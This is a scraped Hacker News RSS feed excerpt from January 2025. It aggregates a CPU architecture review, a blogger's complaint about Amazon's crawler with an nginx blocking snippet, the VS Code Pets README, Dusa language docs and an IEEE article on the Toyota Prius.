https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5571849e-7494-4488-83bf-1cbd5cb8a2be_1593x895.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5571849e-7494-4488-83bf-1cbd5cb8a2be_1593x895.jpeg 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5571849e-7494-4488-83bf-1cbd5cb8a2be_1593x895.jpeg" width="688" height="387" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/5571849e-7494-4488-83bf-1cbd5cb8a2be_1593x895.jpeg&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:387,&quot;width&quot;:688,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:&quot;https://chipsandcheese.com/?attachment_id=32701&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5571849e-7494-4488-83bf-1cbd5cb8a2be_1593x895.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5571849e-7494-4488-83bf-1cbd5cb8a2be_1593x895.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5571849e-7494-4488-83bf-1cbd5cb8a2be_1593x895.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5571849e-7494-4488-83bf-1cbd5cb8a2be_1593x895.jpeg 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>Slide from Intel’s Hot Chips 2024 presentation on Lunar Lake, showing the Skymont cluster mostly containing a Teams workload</figcaption></figure></div><p>That said, Lunar Lake’s aims for better power efficiency, not necessarily for better performance. Skymont’s implementation in Lunar Lake is consistent with targeting lower power. Four Skymont cores are not going to do well against either eight standard Crestmont cores in Meteor Lake or eight Zen 5c cores in AMD’s Strix Point. But they do stand a better chance of containing low intensity workloads like videoconferencing, which are just a bit too demanding for Meteor Lake’s low power Crestmont cluster. Perhaps Lunar Lake’s Skymont cluster focuses harder on containing such workloads. Boosting multithreaded performance is a secondary concern, and landing in the same performance ballpark as Crestmont is good enough.</p><div><figure><a target="_blank" href="https://chipsandcheese.com/?attachment_id=32705" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0d29ae1e-51e6-4703-9648-e62ba85ab471_1585x895.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0d29ae1e-51e6-4703-9648-e62ba85ab471_1585x895.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0d29ae1e-51e6-4703-9648-e62ba85ab471_1585x895.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0d29ae1e-51e6-4703-9648-e62ba85ab471_1585x895.jpeg 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0d29ae1e-51e6-4703-9648-e62ba85ab471_1585x895.jpeg" width="688" height="388" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/0d29ae1e-51e6-4703-9648-e62ba85ab471_1585x895.jpeg&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:388,&quot;width&quot;:688,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:&quot;https://chipsandcheese.com/?attachment_id=32705&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0d29ae1e-51e6-4703-9648-e62ba85ab471_1585x895.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0d29ae1e-51e6-4703-9648-e62ba85ab471_1585x895.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0d29ae1e-51e6-4703-9648-e62ba85ab471_1585x895.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0d29ae1e-51e6-4703-9648-e62ba85ab471_1585x895.jpeg 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>While the LPE-Core cluster on Meteor Lake does a comparatively poor job</figcaption></figure></div><p>When performance really matters, Lion Cove comes into play and does deliver a typical gen-on-gen improvement over Redwood Cove. Thus Lunar Cove should improve performance across a decent range of consumer applications, while also improving power efficiency in long duration, low intensity tasks. Intel designed their chip to meet those goals and I think their decisions made a lot of sense. But I was personally curious about how Skymont’s huge architecture changes would play out. Lunar Lake unfortunately isn’t the right place to evaluate that.</p><p><span>Again, we would like to thank ASUS for sending us over a Zenbook S 14 for review and if you like our articles and journalism, and you want to support us in our endeavors, then consider heading over to our&nbsp;</span><a href="https://www.patreon.com/ChipsandCheese" rel="">Patreon</a><span>&nbsp;or our&nbsp;</span><a href="https://www.paypal.com/donate/?hosted_button_id=4EMPH66SBGVSQ" rel="">PayPal</a><span>&nbsp;if you want to toss a few bucks our way. If you would like to talk with the Chips and Cheese staff and the people behind the scenes, then consider joining our&nbsp;</span><a href="https://discord.gg/TwVnRhxgY2" rel="">Discord</a><span>.</span></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Amazon's AI crawler is making my Git server unstable (556 pts)]]></title>
            <link>https://xeiaso.net/notes/2025/amazon-crawler/</link>
            <guid>42750420</guid>
            <pubDate>Sat, 18 Jan 2025 18:48:51 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://xeiaso.net/notes/2025/amazon-crawler/">https://xeiaso.net/notes/2025/amazon-crawler/</a>, See on <a href="https://news.ycombinator.com/item?id=42750420">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <article>
    
    
    <p>
        Published on <time datetime="2025-01-17">01/17/2025</time>, 259 words, 1 minutes to read
    </p>

    
        <p>Please, just stop.</p>
    

    
        
            
    

    

        
    

    

    <p>EDIT(2025-01-18 19:00 UTC):</p>
<p>I give up. I moved the Gitea server back behind my VPN. I'm working on a proof of work reverse proxy to protect my server from bots in the future. I'll have it back up soon.</p>
<hr>
<p>EDIT(2025-01-17 17:50 UTC):</p>
<p>I added this snippet to the ingress config:</p>
<pre><code><span><span>nginx.ingress.kubernetes.io/configuration-snippet</span><span>:</span> <span>|</span><span>
</span></span><span><span>  if ($http_user_agent ~* "(Amazon)" ){
</span></span><span><span>    return 418;
</span></span><span><span>  }</span>
</span></code></pre>
<p>The bots are still hammering away from a different IP every time. About 10% of the requests do not have the amazonbot user agent. I'm at a loss for what to do next.</p>
<p>I hate the future.</p>
<hr>
<p>Hi all. This is a different kind of post. This is not informative. This is a cry for help.</p>
<p>To whoever runs AmazonBot, please add <code>git.xeserv.us</code> to your list of blocked domains. If you know anyone at Amazon, please forward this to them and ask them to forward it to the AmazonBot team.</p>
<p>Should you want to crawl my git server for some reason, please reach out to me so we can arrange for payment for hardware upgrades commensurate to your egregious resource usage.</p>
<p>I don't want to have to close off my Gitea server to the public, but I will if I have to. It's futile to block AI crawler bots because they lie, change their user agent, use residential IP addresses as proxies, and more. I just want the requests to stop.</p>
<p>I have already configured the <code>robots.txt</code> file to block all bots:</p>
<pre><code><span>User-agent: *
</span><span>Disallow: /
</span></code></pre>
<p>What else do I need to do?</p>

    <hr>

    

    

    <p>Facts and circumstances may have changed since publication. Please contact me before jumping to conclusions if something seems wrong or unclear.</p>

    <p>Tags: </p>
</article>
        </div><div>
            <p>Copyright 2012-2025 Xe Iaso. Any and all opinions listed here are my own and
                not representative of any of my employers, past, future, and/or present.</p>
            
            <p>Served by xesite v4 (/app/xesite) with site version 
                        <a href="https://github.com/Xe/site/commit/96544596603771529cfae4ebf51f00d1dce18b6e">96544596</a>
                    , source code available <a href="https://github.com/Xe/site">here</a>.</p>
        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[VS Code Pets (389 pts)]]></title>
            <link>https://github.com/tonybaloney/vscode-pets</link>
            <guid>42750195</guid>
            <pubDate>Sat, 18 Jan 2025 18:17:59 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/tonybaloney/vscode-pets">https://github.com/tonybaloney/vscode-pets</a>, See on <a href="https://news.ycombinator.com/item?id=42750195">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><div dir="auto">
<p dir="auto"><h2 tabindex="-1" dir="auto">VS Code Pets</h2><a id="user-content-vs-code-pets" aria-label="Permalink: VS Code Pets" href="#vs-code-pets"></a></p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/tonybaloney/vscode-pets/raw/main/icon.png"><img src="https://github.com/tonybaloney/vscode-pets/raw/main/icon.png" alt="icon"></a></p>
</div>    
<div dir="auto"><p>
    Puts a small, bored cat, an enthusiastic dog, a feisty snake, a rubber duck, or Clippy 📎 in your code editor to boost productivity.
    </p><p>
    
    <a href="https://github.com/tonybaloney/vscode-pets/issues/new?assignees=&amp;labels=feature&amp;template=bug_report.md&amp;title=">Report a Bug</a>
    ·
    <a href="https://github.com/tonybaloney/vscode-pets/issues/new?assignees=&amp;labels=feature&amp;template=feature_request.md&amp;title=">Request feature</a></p></div>
<p dir="auto"><a href="https://marketplace.visualstudio.com/items?itemName=tonybaloney.vscode-pets&amp;WT.mc_id=python-17801-anthonyshaw" rel="nofollow"><img src="https://camo.githubusercontent.com/ff039a862a07110ef39ff2a0c7e8511c474f979ef20b8617fbb06b6e4e59bd8f/68747470733a2f2f696d672e736869656c64732e696f2f76697375616c2d73747564696f2d6d61726b6574706c6163652f762f746f6e7962616c6f6e65792e7673636f64652d706574733f636f6c6f723d626c7565266c6f676f3d76697375616c2d73747564696f" alt="Visual Studio Marketplace Version" data-canonical-src="https://img.shields.io/visual-studio-marketplace/v/tonybaloney.vscode-pets?color=blue&amp;logo=visual-studio"></a>
<a href="https://marketplace.visualstudio.com/items?itemName=tonybaloney.vscode-pets&amp;WT.mc_id=python-17801-anthonyshaw" rel="nofollow"><img src="https://camo.githubusercontent.com/e13577de308cf988b3246a7b6749a588b699524f776e353ef83f7b930fb52477/68747470733a2f2f696d672e736869656c64732e696f2f76697375616c2d73747564696f2d6d61726b6574706c6163652f692f746f6e7962616c6f6e65792e7673636f64652d706574733f6c6f676f3d76697375616c73747564696f" alt="Visual Studio Marketplace Installs" data-canonical-src="https://img.shields.io/visual-studio-marketplace/i/tonybaloney.vscode-pets?logo=visualstudio"></a>
<a href="https://marketplace.visualstudio.com/items?itemName=tonybaloney.vscode-pets&amp;WT.mc_id=python-17801-anthonyshaw" rel="nofollow"><img src="https://camo.githubusercontent.com/3cb2825243f710557ae49e2648ed067c481dc7ae0ef021b1974ac7fa77713a09/68747470733a2f2f696d672e736869656c64732e696f2f76697375616c2d73747564696f2d6d61726b6574706c6163652f642f746f6e7962616c6f6e65792e7673636f64652d706574733f6c6f676f3d76697375616c73747564696f" alt="Visual Studio Marketplace Downloads" data-canonical-src="https://img.shields.io/visual-studio-marketplace/d/tonybaloney.vscode-pets?logo=visualstudio"></a></p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/tonybaloney/vscode-pets/raw/main/docs/source/_static/screenshot.gif"><img src="https://github.com/tonybaloney/vscode-pets/raw/main/docs/source/_static/screenshot.gif" alt="screenshot" data-animated-image=""></a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Installation</h2><a id="user-content-installation" aria-label="Permalink: Installation" href="#installation"></a></p>
<p dir="auto">Install this extension from the <a href="https://marketplace.visualstudio.com/items?itemName=tonybaloney.vscode-pets&amp;WT.mc_id=python-17801-anthonyshaw" rel="nofollow">VS Code marketplace</a>.</p>
<p dir="auto">OR</p>
<p dir="auto">With VS Code open, search for <code>vscode-pets</code> in the extension panel (<code>Ctrl+Shift+X</code> on Windows/Linux or <code>Cmd(⌘)+Shift+X</code> on MacOS) and click install.</p>
<p dir="auto">OR</p>
<p dir="auto">With VS Code open, launch VS Code Quick Open (<code>Ctrl+P</code> on Windows/Linux or <code>Cmd(⌘)+P</code> on MacOS), paste the following command, and press enter.</p>
<p dir="auto"><code>ext install tonybaloney.vscode-pets</code></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Using VS Code Pets</h2><a id="user-content-using-vs-code-pets" aria-label="Permalink: Using VS Code Pets" href="#using-vs-code-pets"></a></p>
<p dir="auto">Congrats on installing joy! Enjoy interacting with these cute pixelated pets. Read below to get a full understanding of this extension. Not convinced? Watch our extension spotlight on <a href="https://www.youtube.com/watch?v=aE6Ifj_KstI" rel="nofollow">Visual Studio Code</a>.</p>
<p dir="auto">After installing, open the command palette with <code>Ctrl+Shift+P</code> on Windows/Linux or <code>Cmd(⌘)+Shift+P</code> on MacOS.</p>
<p dir="auto">Run the "Start pet coding session" command (<code>vscode-pets.start</code>) to see a cat in VS Code:</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/tonybaloney/vscode-pets/raw/main/docs/source/_static/pet-in-default-explorer.png"><img src="https://github.com/tonybaloney/vscode-pets/raw/main/docs/source/_static/pet-in-default-explorer.png" alt="Default view"></a></p>
<p dir="auto"><a href="https://tonybaloney.github.io/vscode-pets" rel="nofollow">Now checkout the documentation to see what else is possible!</a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Translation</h2><a id="user-content-translation" aria-label="Permalink: Translation" href="#translation"></a></p>
<p dir="auto">Visit the <a href="https://crowdin.com/project/vscode-pets" rel="nofollow">Crowdin Project</a> in case you'd like to help with the translations. It will be synced automatically to the repository. You can also request a new language in the <a href="https://crowdin.com/project/vscode-pets/discussions" rel="nofollow">Discussions</a> section.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Credits</h2><a id="user-content-credits" aria-label="Permalink: Credits" href="#credits"></a></p>
<p dir="auto">The cat animations were designed by <a href="https://seethingswarm.itch.io/catset" rel="nofollow">seethingswarm</a>. The dog media assets for this extension were designed by <a href="https://nvph-studio.itch.io/dog-animation-4-different-dogs" rel="nofollow">NVPH Studio</a>.</p>
<p dir="auto">The forest theme was designed by <a href="https://edermunizz.itch.io/free-pixel-art-forest" rel="nofollow">edermunizz</a>. The castle assets were created using artwork by <a href="https://guttykreum.itch.io/gothic-castle-game-assets" rel="nofollow">GuttyKreum</a>.</p>
<p dir="auto"><a href="https://twitter.com/marcduiker" rel="nofollow">Marc Duiker</a> created the Clippy, Rocky, Zappy, rubber duck, snake, cockatiel, Ferris the crab, and Mod the dotnet bot media assets.</p>
<p dir="auto"><a href="https://twitter.com/pixelthen" rel="nofollow">Elthen</a> created the fox media assets.</p>
<p dir="auto"><a href="https://www.aldeka.net/" rel="nofollow">Karen Rustad Tölva</a> designed the original concept of Ferris the crab.</p>
<p dir="auto"><a href="https://github.com/kevin2huang">Kevin Huang</a> created the Akita inu media assets.</p>
<p dir="auto">The turtle animations were designed by enkeefe using <a href="https://www.pixilart.com/draw" rel="nofollow">Pixelart</a>.</p>
<p dir="auto">The horse animations were adapted by <a href="https://github.com/thechriskent">Chris Kent</a> from assets by <a href="https://onfe.itch.io/horse-sprite-with-rider-asset-pack" rel="nofollow">Onfe</a>.</p>
<p dir="auto"><a href="https://github.com/WoofWoof0">Kennet Shin</a> created the snail media assets.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Thank you</h2><a id="user-content-thank-you" aria-label="Permalink: Thank you" href="#thank-you"></a></p>
<p dir="auto">Thanks to all the <a href="https://github.com/tonybaloney/vscode-pets/graphs/contributors">contributors</a> to this project.</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[O1 isn't a chat model (and that's the point) (146 pts)]]></title>
            <link>https://www.latent.space/p/o1-skill-issue</link>
            <guid>42750096</guid>
            <pubDate>Sat, 18 Jan 2025 18:04:19 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.latent.space/p/o1-skill-issue">https://www.latent.space/p/o1-skill-issue</a>, See on <a href="https://news.ycombinator.com/item?id=42750096">Hacker News</a></p>
Couldn't get https://www.latent.space/p/o1-skill-issue: Error: timeout of 10000ms exceeded]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Interactive systemd – a better way to work with systemd units (452 pts)]]></title>
            <link>https://isd-project.github.io/isd/</link>
            <guid>42749402</guid>
            <pubDate>Sat, 18 Jan 2025 16:22:03 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://isd-project.github.io/isd/">https://isd-project.github.io/isd/</a>, See on <a href="https://news.ycombinator.com/item?id=42749402">Hacker News</a></p>
Couldn't get https://isd-project.github.io/isd/: Error: timeout of 10000ms exceeded]]></description>
        </item>
        <item>
            <title><![CDATA[Dusa Programming Language (Finite-Choice Logic Programming) (147 pts)]]></title>
            <link>https://dusa.rocks/docs/</link>
            <guid>42749147</guid>
            <pubDate>Sat, 18 Jan 2025 15:45:26 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://dusa.rocks/docs/">https://dusa.rocks/docs/</a>, See on <a href="https://news.ycombinator.com/item?id=42749147">Hacker News</a></p>
<div id="readability-page-1" class="page"><div> <p>Dusa is a logic programming language designed by
<a href="https://typesafety.net/rob/">Rob Simmons</a> and
<a href="https://www.khoury.northeastern.edu/home/cmartens/">Chris Martens</a>,
the first implementation of finite-choice logic programming.</p>
<ul>
<li>If you’ve heard of Datalog (as implemented in systems like
<a href="https://souffle-lang.github.io/program">Soufflé</a>), you may want to start by
reading about how <a href="https://dusa.rocks/docs/introductions/datalog/">Dusa is datalog</a>.</li>
<li>If you’ve heard of answer set programming (as implemented in systems
like <a href="https://potassco.org/">Potassco</a>), you may want to start by reading
about how <a href="https://dusa.rocks/docs/introductions/asp/">Dusa is answer set programming</a>.</li>
<li>If you have no familarity with either of these, that’s okay too! You may
want to start by reading about how
<a href="https://dusa.rocks/docs/introductions/graph/">Dusa is a graph exploration language</a>.
Then you can take a look at some of the other introductions, or
<a href="https://dusa.rocks/">fiddle with some of the default examples</a>.</li>
<li>If you’re interested in the mathematics of finite-choice logic programming,
the paper
<a href="https://popl25.sigplan.org/details/POPL-2025-popl-research-papers/13/Finite-Choice-Logic-Programming">Finite-Choice Logic Programming</a>
by Martens, Simmons, and Michael Arntzenius may be of interest.</li>
</ul>
<p>The easiest way to use Dusa is in our <a href="https://dusa.rocks/">web editor</a>.
Dusa is also available as a command-line utility and JavaScript API via the
<a href="https://www.npmjs.com/package/dusa">Node package manager</a>.</p> </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Why do bees die when they sting you? (285 pts)]]></title>
            <link>https://www.subanima.org/bees/</link>
            <guid>42749069</guid>
            <pubDate>Sat, 18 Jan 2025 15:32:41 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.subanima.org/bees/">https://www.subanima.org/bees/</a>, See on <a href="https://news.ycombinator.com/item?id=42749069">Hacker News</a></p>
Couldn't get https://www.subanima.org/bees/: Error: timeout of 10000ms exceeded]]></description>
        </item>
        <item>
            <title><![CDATA[HNInternal: Ask HN: Has anyone tried alternative company models (like a co-op) for SaaS? (157 pts)]]></title>
            <link>https://news.ycombinator.com/item?id=42748394</link>
            <guid>42748394</guid>
            <pubDate>Sat, 18 Jan 2025 14:05:20 GMT</pubDate>
            <description><![CDATA[<p>See on <a href="https://news.ycombinator.com/item?id=42748394">Hacker News</a></p>
Couldn't get https://news.ycombinator.com/item?id=42748394: Error: timeout of 10000ms exceeded]]></description>
        </item>
        <item>
            <title><![CDATA[The Toyota Prius transformed the auto industry (153 pts)]]></title>
            <link>https://spectrum.ieee.org/toyota-prius-transformed-auto-industry</link>
            <guid>42747899</guid>
            <pubDate>Sat, 18 Jan 2025 12:38:34 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://spectrum.ieee.org/toyota-prius-transformed-auto-industry">https://spectrum.ieee.org/toyota-prius-transformed-auto-industry</a>, See on <a href="https://news.ycombinator.com/item?id=42747899">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-headline="The Toyota Prius Transformed the Auto Industry"><p>In the early 1990s, <a href="https://www.toyota.com/" rel="noopener noreferrer" target="_blank">Toyota</a> saw that environmental awareness and tighter emissions regulations would shape the future of the automotive industry. The company aimed to create an eco-friendly, efficient <a href="https://spectrum.ieee.org/topic/transportation/" target="_self">vehicle</a> that would meet future standards.</p><p>In 1997 Toyota introduced the <a href="https://www.toyota.com/prius/" rel="noopener noreferrer" target="_blank">Prius</a> to the Japanese market. The car was the world’s first mass-produced hybrid vehicle that combined gasoline and electric power to reduce fuel consumption and emissions. Its worldwide debut came in 2000.</p><p>Developing the Prius posed significant technical and market challenges that included designing an efficient hybrid power train, managing battery technology, and overcoming consumer skepticism about combining an electric drivetrain system with the standard gasoline-fueled power train. Toyota persevered, however, and its instincts proved prescient and transformative.</p><p>“The Prius is not only the world’s first mass-produced hybrid car, but its technical and commercial success also spurred other automakers to accelerate hybrid vehicle development,” says IEEE Member<a href="https://ieeexplore.ieee.org/author/37274113100" rel="noopener noreferrer" target="_blank"> Nobuo Kawaguchi</a>, a professor in the computational science and engineering department at<a href="https://www.engg.nagoya-u.ac.jp/?lang=en" rel="noopener noreferrer" target="_blank"> Nagoya University’s Graduate School of Engineering</a>, in Japan. He is also secretary of the<a href="https://ieee-jp.org/section/nagoya/%EF%BC%9C%E5%95%8F%E3%81%84%E5%90%88%E3%82%8F%E3%81%9B%EF%BC%9E/" rel="noopener noreferrer" target="_blank"> IEEE Nagoya Section</a>. “The Prius helped shape the role of hybrid cars in today’s automotive market.”</p><p>The Prius was honored with an<a href="https://ieeemilestones.ethw.org/w/index.php/Milestone-Proposal:Deep_Space_Station_43%2C_1973" rel="noopener noreferrer" target="_blank"> IEEE Milestone</a> on 30 October during a ceremony held at company headquarters in Toyota City, Japan.</p><h2>The G21 project</h2><p>The development of the Prius began in 1993 with the <a href="https://www.toyota-global.com/company/history_of_toyota/75years/text/leaping_forward_as_a_global_corporation/chapter4/section8/item1_a.html" rel="noopener noreferrer" target="_blank">G21 project</a>, which focused on fuel efficiency, low emissions, and affordability. According to a Toyota article detailing the project’s history, by 1997, Toyota engineers—including <a href="https://global.toyota/en/company/profile/executives/takeshi_uchiyamada.html" rel="noopener noreferrer" target="_blank">Takeshi Uchiyamada</a>, who has since become known as the “father of the Prius”—were satisfied they had met the challenge of achieving all three goals. </p><p>The first-generation Prius featured a compact design with aerodynamic efficiency. Its groundbreaking hybrid system enabled smooth transitions between an electric motor powered by a nickel–metal hydride battery and an internal combustion engine fueled by gasoline. </p><p>The car’s design incorporated <a href="https://en.wikipedia.org/wiki/Regenerative_braking" rel="noopener noreferrer" target="_blank">regenerative braking</a> in the power-train arrangement to enhance the vehicle’s <a href="https://spectrum.ieee.org/topic/climate-tech/" target="_self">energy efficiency</a>. Regenerative braking captures the kinetic energy typically lost as heat when conventional brake pads stop the wheels with friction. Instead, the electric motor switches over to generator mode so that the wheels drive the motor in reverse rather than the motor driving the wheels. Using the motor as a generator slows the car and converts the kinetic energy into an electrical charge routed to the battery to recharge it.</p><p>“The Prius is not only the world’s first mass-produced hybrid car, but its technical and commercial success also spurred other automakers to <span>accelerate hybrid vehicle development.” <strong>—Nobuo Kawaguchi, IEEE Nagoya Section secretary</strong></span></p><p><span></span>According to the company’s “<a href="https://www.riveratoyota.com/HarnessingEfficiencyADeepDiveintoToyotasHybridTechnology/" target="_blank">Harnessing Efficiency: A Deep Dive Into Toyota’s Hybrid Technology</a>” article, a breakthrough was the<a href="https://www.beechmonttoyota.com/manufacturer-information/toyota-hybrid-synergy-drive/" rel="noopener noreferrer" target="_blank"> Hybrid Synergy Drive</a>, a system that allows the Prius to operate in different modes—electric only, gasoline only, or a combination—depending on driving conditions.</p><p>A key component Toyota engineers developed from scratch was the power split device, a planetary gear system that allows smooth transitions between electric and gasoline power, permitting the engine and the motor to propel the vehicle in their respective optimal performance ranges. The arrangement helps optimize fuel economy and simplifies the drivetrain by making a traditional transmission unnecessary. </p><h2>Setting fuel-efficiency records</h2><p>Nearly 30 years after its commercial debut, the Prius remains an icon of environmental responsibility combined with technical innovation. It is still setting records for fuel efficiency. When in July 2023 the newly released <a href="https://www.toyota.com/prius/" rel="noopener noreferrer" target="_blank">2024 Prius LE</a> was driven from Los Angeles to New York City, it consumed a miserly<a href="https://pressroom.toyota.com/toyota-prius-sets-guinness-world-record-for-highest-mpg-for-a-coast-to-coast-drive/" rel="noopener noreferrer" target="_blank"> 2.52 liters of gasoline per 100 kilometers</a> during the 5,150-km cross-country journey. The record was set by a so-called hypermiler, a driver who practices advanced driving techniques aimed at optimizing fuel efficiency. Hypermilers accelerate smoothly and avoid hard braking. They let off the accelerator early so the car can coast to a gradual stop without applying the brakes, and they drive as often as possible at speeds between 72 and 105 km per hour, the velocities at which a car is typically most efficient.</p><p>A driver not employing such techniques still can expect fuel economy as high as 4.06 L per 100 km from the latest generation of Prius models.</p><p>Toyota has advanced the Prius’s hybrid technology with each generation, solidifying the car’s role as a leader in fuel efficiency and sustainability. </p><h2>Milestone event attracts luminaries</h2><p>Uchiyamada gave a brief talk at the IEEE Milestone event about the Prius’s development process and the challenges he faced as chief G21 engineer. Other notable attendees were <a href="https://global.toyota/en/newsroom/corporate/39254426.html" rel="noopener noreferrer" target="_blank">Takeshi Uehara</a>, president of Toyota’s power-train company; <a href="http://www.toshiofukuda.org/" rel="noopener noreferrer" target="_blank">Toshio Fukuda</a>, 2020 IEEE president; <a href="https://ieee-jp.org/en/activity/jchc.html" rel="noopener noreferrer" target="_blank">Isao Shirakawa</a>, <a href="https://ieee-jp.org/en/" rel="noopener noreferrer" target="_blank">IEEE Japan Council</a> history committee chair; and <a href="https://www.ieeer10.org/wp-content/uploads/2023/02/230228Annual-Report-2022-Nagoya-Section.pdf" rel="noopener noreferrer" target="_blank">Jun Sato</a>, <a href="https://ieee-jp.org/section/nagoya/" rel="noopener noreferrer" target="_blank">IEEE Nagoya Section</a> chair.</p><p>A plaque recognizing the technology is displayed at the entrance of the <a href="https://www.toyota-td.jp/en/corporate/office/" rel="noopener noreferrer" target="_blank">Toyota Technical Center</a>, which is within walking distance of the company’s headquarters. It reads:</p><p><em><em>“In 1997 Toyota Motor Corporation developed the world’s first mass-produced hybrid vehicle, the Toyota Prius, which used both an internal combustion engine and two <a href="https://spectrum.ieee.org/tag/electric-motors">electric motors</a>. This vehicle achieved revolutionary fuel efficiency by recovering and reusing energy previously lost while driving. Its success helped popularize hybrid vehicles internationally, advanced the technology essential for electric power trains, contributed to the reduction of CO</em></em><em><em><span>2</span></em></em><em><em> emissions, and influenced the design of subsequent electrified vehicles.”</em></em></p><p>Administered by the <a href="https://www.ieee.org/about/history-center/" target="_blank">IEEE History Center</a> and supported by donors, the Milestone program recognizes outstanding technical developments worldwide. The IEEE Nagoya Section sponsored the nomination.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Windows BitLocker – Screwed Without a Screwdriver (162 pts)]]></title>
            <link>https://neodyme.io/en/blog/bitlocker_screwed_without_a_screwdriver/</link>
            <guid>42747877</guid>
            <pubDate>Sat, 18 Jan 2025 12:31:20 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://neodyme.io/en/blog/bitlocker_screwed_without_a_screwdriver/">https://neodyme.io/en/blog/bitlocker_screwed_without_a_screwdriver/</a>, See on <a href="https://news.ycombinator.com/item?id=42747877">Hacker News</a></p>
